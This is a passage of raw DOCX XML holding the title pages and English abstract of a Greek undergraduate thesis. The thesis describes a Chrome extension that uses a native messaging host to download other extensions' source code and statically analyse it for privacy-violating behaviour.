          </w:tcPr>
          <w:p w14:paraId="54EC4318" w14:textId="77777777" w:rsidR="00D12E1D" w:rsidRDefault="002B3B20" w:rsidP="0047028D">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="1980"/>
              </w:tabs>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:ins w:id="10" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:26:00Z"/>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Dimitris Mitropoulos</w:t>
            </w:r>
            <w:r w:rsidR="002D2B00" w:rsidRPr="002D2B00">
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidR="0047028D">
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Adjunct Professor</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C6966D5" w14:textId="06D6D7F3" w:rsidR="002D2B00" w:rsidRPr="00C45088" w:rsidRDefault="0047028D" w:rsidP="0047028D">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="1980"/>
              </w:tabs>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:del w:id="11" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:26:00Z">
              <w:r w:rsidDel="00D12E1D">
                <w:rPr>
                  <w:b/>
                </w:rPr>
                <w:delText xml:space="preserve"> </w:delText>
              </w:r>
            </w:del>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Alexis Delis, Professor</w:t>
            </w:r>
            <w:r w:rsidR="002D2B00">
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="56613723" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="00501B0B" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1701"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A8D2DED" w14:textId="77777777" w:rsidR="008B02EC" w:rsidRPr="00295C39" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4527D2BC" w14:textId="77777777" w:rsidR="008B02EC" w:rsidRPr="00295C39" w:rsidRDefault="008B02EC" w:rsidP="008B02EC">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23CC56E2" w14:textId="77777777" w:rsidR="008B02EC" w:rsidRPr="00295C39" w:rsidRDefault="008B02EC" w:rsidP="008B02EC">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="712DD4BF" w14:textId="77777777" w:rsidR="00165B67" w:rsidRPr="005B5B30" w:rsidRDefault="00165B67" w:rsidP="008B02EC">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>ΠΤΥΧΙΑΚΗ ΕΡΓΑΣΙΑ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06478985" w14:textId="77777777" w:rsidR="008B02EC" w:rsidRPr="005B5B30" w:rsidRDefault="008B02EC" w:rsidP="008B02EC">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0173569D" w14:textId="77777777" w:rsidR="008B02EC" w:rsidRPr="005B5B30" w:rsidRDefault="008B02EC" w:rsidP="008B02EC">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40CE675A" w14:textId="77777777" w:rsidR="004612C0" w:rsidRPr="005B5B30" w:rsidRDefault="004612C0" w:rsidP="008B02EC">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="495FC8E1" w14:textId="51C65090" w:rsidR="00210431" w:rsidRPr="004974BF" w:rsidRDefault="004974BF" w:rsidP="00210431">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">Ανιχνεύοντας </w:t>
      </w:r>
      <w:r w:rsidR="00210431" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">Κακόβουλες Επεκτάσεις </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>Φυλλομετρηρών με Στατική Ανάλυση</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AAA353A" w14:textId="77777777" w:rsidR="008B02EC" w:rsidRPr="005B5B30" w:rsidRDefault="008B02EC" w:rsidP="008B02EC">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EC8FBF0" w14:textId="77777777" w:rsidR="00F86A9D" w:rsidRPr="005B5B30" w:rsidRDefault="00F86A9D" w:rsidP="00916998">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F76086B" w14:textId="77777777" w:rsidR="00F86A9D" w:rsidRPr="005B5B30" w:rsidRDefault="00F86A9D" w:rsidP="00916998">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E2DCFCE" w14:textId="77777777" w:rsidR="00165B67" w:rsidRPr="005B5B30" w:rsidRDefault="00B45006" w:rsidP="00916998">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>Ηλίας Α. Ραφαήλ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E89F0FF" w14:textId="77777777" w:rsidR="00165B67" w:rsidRPr="005B5B30" w:rsidRDefault="00165B67" w:rsidP="008B02EC">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>Α.Μ.:</w:t>
      </w:r>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B45006" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>1115201300149</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CEF3457" w14:textId="77777777" w:rsidR="008B02EC" w:rsidRPr="005B5B30" w:rsidRDefault="008B02EC" w:rsidP="008B02EC">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FB7AEF1" w14:textId="77777777" w:rsidR="00165B67" w:rsidRPr="005B5B30" w:rsidRDefault="00165B67" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74BF3C5F" w14:textId="77777777" w:rsidR="002D0273" w:rsidRPr="005B5B30" w:rsidRDefault="002D0273" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="677C0D35" w14:textId="77777777" w:rsidR="002D0273" w:rsidRPr="005B5B30" w:rsidRDefault="002D0273" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D139E78" w14:textId="77777777" w:rsidR="002D0273" w:rsidRPr="005B5B30" w:rsidRDefault="002D0273" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14B330DF" w14:textId="77777777" w:rsidR="002D0273" w:rsidRPr="005B5B30" w:rsidRDefault="002D0273" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3966953B" w14:textId="77777777" w:rsidR="002D0273" w:rsidRPr="005B5B30" w:rsidRDefault="002D0273" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F77D772" w14:textId="77777777" w:rsidR="002D0273" w:rsidRPr="005B5B30" w:rsidRDefault="002D0273" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2390F02E" w14:textId="77777777" w:rsidR="009B5896" w:rsidRPr="005B5B30" w:rsidRDefault="009B5896" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A5ADE4B" w14:textId="77777777" w:rsidR="009B5896" w:rsidRPr="005B5B30" w:rsidRDefault="009B5896" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B0EA4F5" w14:textId="77777777" w:rsidR="008F33DE" w:rsidRPr="005B5B30" w:rsidRDefault="008F33DE" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BDB304E" w14:textId="77777777" w:rsidR="008F33DE" w:rsidRPr="005B5B30" w:rsidRDefault="008F33DE" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02D9105C" w14:textId="77777777" w:rsidR="008F33DE" w:rsidRPr="005B5B30" w:rsidRDefault="008F33DE" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C553BBD" w14:textId="77777777" w:rsidR="008F33DE" w:rsidRPr="005B5B30" w:rsidRDefault="008F33DE" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CE1A2D8" w14:textId="77777777" w:rsidR="008F33DE" w:rsidRPr="005B5B30" w:rsidRDefault="008F33DE" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07311981" w14:textId="77777777" w:rsidR="00E05D30" w:rsidRPr="005B5B30" w:rsidRDefault="00E05D30" w:rsidP="002D0273">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2174"/>
        <w:gridCol w:w="7397"/>
      </w:tblGrid>
      <w:tr w:rsidR="00846F73" w:rsidRPr="00472A24" w14:paraId="582B629C" w14:textId="77777777" w:rsidTr="002D335C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2174" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="01AC25F6" w14:textId="77777777" w:rsidR="00846F73" w:rsidRPr="002D335C" w:rsidRDefault="00846F73" w:rsidP="002D335C">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="1980"/>
              </w:tabs>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002D335C">
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>ΕΠΙΒΛΕΠΟΝΤΕΣ:</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7397" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="73563885" w14:textId="58FDF28B" w:rsidR="00F10BEF" w:rsidRPr="00F10BEF" w:rsidRDefault="00E34D88" w:rsidP="004974BF">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="1980"/>
              </w:tabs>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:ins w:id="12" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:26:00Z"/>
                <w:b/>
                <w:lang w:val="el-GR"/>
                <w:rPrChange w:id="13" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:27:00Z">
                  <w:rPr>
                    <w:ins w:id="14" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:26:00Z"/>
                    <w:lang w:val="el-GR"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005B5B30">
              <w:rPr>
                <w:b/>
                <w:lang w:val="el-GR"/>
              </w:rPr>
              <w:t xml:space="preserve">Δημήτρης </w:t>
            </w:r>
            <w:r w:rsidRPr="00F10BEF">
              <w:rPr>
                <w:b/>
                <w:lang w:val="el-GR"/>
              </w:rPr>
              <w:t>Μητρόπουλος</w:t>
            </w:r>
            <w:r w:rsidR="00846F73" w:rsidRPr="00F10BEF">
              <w:rPr>
                <w:b/>
                <w:lang w:val="el-GR"/>
              </w:rPr>
              <w:t>,</w:t>
            </w:r>
            <w:ins w:id="15" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:27:00Z">
              <w:r w:rsidR="00105FDF">
                <w:rPr>
                  <w:b/>
                  <w:lang w:val="el-GR"/>
                </w:rPr>
                <w:t xml:space="preserve"> </w:t>
              </w:r>
            </w:ins>
            <w:del w:id="16" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:27:00Z">
              <w:r w:rsidR="004974BF" w:rsidRPr="00F10BEF" w:rsidDel="00F10BEF">
                <w:rPr>
                  <w:b/>
                  <w:lang w:val="el-GR"/>
                </w:rPr>
                <w:delText xml:space="preserve"> </w:delText>
              </w:r>
            </w:del>
            <w:r w:rsidR="004974BF" w:rsidRPr="00F10BEF">
              <w:rPr>
                <w:b/>
                <w:lang w:val="el-GR"/>
                <w:rPrChange w:id="17" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:27:00Z">
                  <w:rPr>
                    <w:lang w:val="el-GR"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
              <w:t>Επισκέπτης Καθηγητής</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4438F568" w14:textId="4DC339DB" w:rsidR="009B5896" w:rsidRPr="005B5B30" w:rsidRDefault="004974BF" w:rsidP="004974BF">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="1980"/>
              </w:tabs>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:lang w:val="el-GR"/>
              </w:rPr>
            </w:pPr>
            <w:del w:id="18" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:26:00Z">
              <w:r w:rsidRPr="00F10BEF" w:rsidDel="00F10BEF">
                <w:rPr>
                  <w:b/>
                  <w:lang w:val="el-GR"/>
                  <w:rPrChange w:id="19" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:27:00Z">
                    <w:rPr>
                      <w:lang w:val="el-GR"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve"> </w:delText>
              </w:r>
            </w:del>
            <w:r w:rsidRPr="00F10BEF">
              <w:rPr>
                <w:b/>
                <w:lang w:val="el-GR"/>
                <w:rPrChange w:id="20" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:27:00Z">
                  <w:rPr>
                    <w:lang w:val="el-GR"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
              <w:t>Αλέξης Δελής, Καθηγητής</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1372E4A0" w14:textId="77777777" w:rsidR="005C6CE3" w:rsidRPr="005B5B30" w:rsidRDefault="005C6CE3" w:rsidP="00846F73">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1701"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39B97B75" w14:textId="77777777" w:rsidR="00815487" w:rsidRPr="001D5415" w:rsidRDefault="00530578" w:rsidP="00815487">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00236295">
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
      <w:bookmarkStart w:id="21" w:name="_Toc219883670"/>
      <w:bookmarkStart w:id="22" w:name="_Toc219883669"/>
      <w:r w:rsidR="00815487" w:rsidRPr="001D5415">
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ABSTRACT</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="1BC20D39" w14:textId="77777777" w:rsidR="00815487" w:rsidRPr="00B361E8" w:rsidRDefault="00815487" w:rsidP="00815487"/>
    <w:p w14:paraId="7E8215C0" w14:textId="69FB3B96" w:rsidR="002967CB" w:rsidRPr="00C6261B" w:rsidRDefault="002967CB" w:rsidP="002967CB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Today the use of extensions is widespread for users of all major web browsers such as Chrome. </w:t>
      </w:r>
      <w:r w:rsidRPr="000F641D">
        <w:t xml:space="preserve">There is also a large increase in the number of personal data that search engines </w:t>
      </w:r>
      <w:r>
        <w:t>mediate</w:t>
      </w:r>
      <w:r w:rsidRPr="000F641D">
        <w:t xml:space="preserve">, and as a result they become the target of </w:t>
      </w:r>
      <w:r w:rsidR="0047028D">
        <w:t>attackers who take</w:t>
      </w:r>
      <w:r w:rsidRPr="000F641D">
        <w:t xml:space="preserve"> advantage of how extensions work</w:t>
      </w:r>
      <w:r w:rsidR="0047028D">
        <w:t xml:space="preserve"> to</w:t>
      </w:r>
      <w:r w:rsidRPr="000F641D">
        <w:t xml:space="preserve"> gather various information from the</w:t>
      </w:r>
      <w:r w:rsidR="0047028D">
        <w:t xml:space="preserve"> unsuspecting</w:t>
      </w:r>
      <w:r w:rsidRPr="000F641D">
        <w:t xml:space="preserve"> user without </w:t>
      </w:r>
      <w:r w:rsidR="0047028D">
        <w:t>their consent</w:t>
      </w:r>
      <w:r w:rsidRPr="000F641D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C88BED" w14:textId="77777777" w:rsidR="003B1375" w:rsidRDefault="002967CB" w:rsidP="002967CB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The goal of this thesis is to implement </w:t>
      </w:r>
      <w:r w:rsidR="003B1375">
        <w:t>an</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> extension </w:t>
      </w:r>
      <w:r w:rsidRPr="00267F27">
        <w:t xml:space="preserve">that </w:t>
      </w:r>
      <w:r w:rsidR="003B1375">
        <w:t>monitors the functionality of an extension to detect suspicious actions that may violate the user’s privacy. We have implemented our approach as a chrome extension.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A71751" w14:textId="1CFE5B44" w:rsidR="002967CB" w:rsidRPr="000F641D" w:rsidRDefault="002967CB" w:rsidP="002967CB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00537F09">
        <w:t>The way the extension works is</w:t>
      </w:r>
      <w:ins w:id="23" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:36:00Z">
        <w:r w:rsidR="00D46F45">
          <w:t xml:space="preserve"> the following: first, it</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00537F09">
        <w:t xml:space="preserve"> initially </w:t>
      </w:r>
      <w:r>
        <w:t>connects</w:t>
      </w:r>
      <w:r w:rsidRPr="00537F09">
        <w:t xml:space="preserve"> to a Native Messaging Host, which sends information about the identity of the extension that the user has chosen </w:t>
      </w:r>
      <w:r>
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidRPr="00537F09">
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="005B5B30">
        <w:t xml:space="preserve">(native) </w:t>
      </w:r>
      <w:r w:rsidRPr="00537F09">
        <w:t>application.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00537F09">
        <w:t>The</w:t>
      </w:r>
      <w:ins w:id="24" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:36:00Z">
        <w:r w:rsidR="004B538D">
          <w:t>n, the</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00537F09">
        <w:t xml:space="preserve"> application will download the extension's source code and perform a static analysis of the code.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00537F09">
        <w:t>Every time a suspicious action is detected, it will inform the user with a corresponding warning message and the file in which the action was detected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="093659FE" w14:textId="77777777" w:rsidR="00815487" w:rsidRPr="002967CB" w:rsidRDefault="00815487" w:rsidP="00815487"/>
    <w:p w14:paraId="05271768" w14:textId="77777777" w:rsidR="00815487" w:rsidRPr="002967CB" w:rsidRDefault="00815487" w:rsidP="00815487"/>
    <w:p w14:paraId="47B991C0" w14:textId="77777777" w:rsidR="00815487" w:rsidRPr="002967CB" w:rsidRDefault="00815487" w:rsidP="00815487"/>
    <w:p w14:paraId="35194998" w14:textId="77777777" w:rsidR="00815487" w:rsidRPr="002967CB" w:rsidRDefault="00815487" w:rsidP="00815487"/>
    <w:p w14:paraId="262913B4" w14:textId="77777777" w:rsidR="00815487" w:rsidRPr="002967CB" w:rsidRDefault="00815487" w:rsidP="00815487"/>
    <w:p w14:paraId="10E59ECF" w14:textId="77777777" w:rsidR="00815487" w:rsidRPr="002967CB" w:rsidRDefault="00815487" w:rsidP="00815487"/>
    <w:p w14:paraId="540A2A70" w14:textId="77777777" w:rsidR="00815487" w:rsidRPr="002967CB" w:rsidRDefault="00815487" w:rsidP="00815487"/>
    <w:p w14:paraId="250AF038" w14:textId="77777777" w:rsidR="00815487" w:rsidRPr="002967CB" w:rsidRDefault="00815487" w:rsidP="00815487"/>
    <w:p w14:paraId="2FAE4C8B" w14:textId="77777777" w:rsidR="00815487" w:rsidRPr="002967CB" w:rsidRDefault="00815487" w:rsidP="00815487"/>
    <w:p w14:paraId="4CBB2CD0" w14:textId="77777777" w:rsidR="00815487" w:rsidRPr="002967CB" w:rsidRDefault="00815487" w:rsidP="00815487"/>
    <w:p w14:paraId="43B309DE" w14:textId="77777777" w:rsidR="00815487" w:rsidRPr="002967CB" w:rsidRDefault="00815487" w:rsidP="00815487"/>
    <w:p w14:paraId="468E6F7A" w14:textId="5FE28DBF" w:rsidR="00815487" w:rsidRPr="00B361E8" w:rsidRDefault="00815487" w:rsidP="00815487">
      <w:r w:rsidRPr="00897C0A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SUBJECT</w:t>
      </w:r>
      <w:r w:rsidRPr="00B361E8">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00897C0A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AREA</w:t>
      </w:r>
      <w:r w:rsidRPr="00B361E8">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00726C29">
        <w:t>Program Analysis, Static A</w:t>
      </w:r>
      <w:r w:rsidR="00B361E8">
        <w:t>nalysis</w:t>
      </w:r>
      <w:r w:rsidR="00726C29">
        <w:t>, Malicious Software</w:t>
      </w:r>
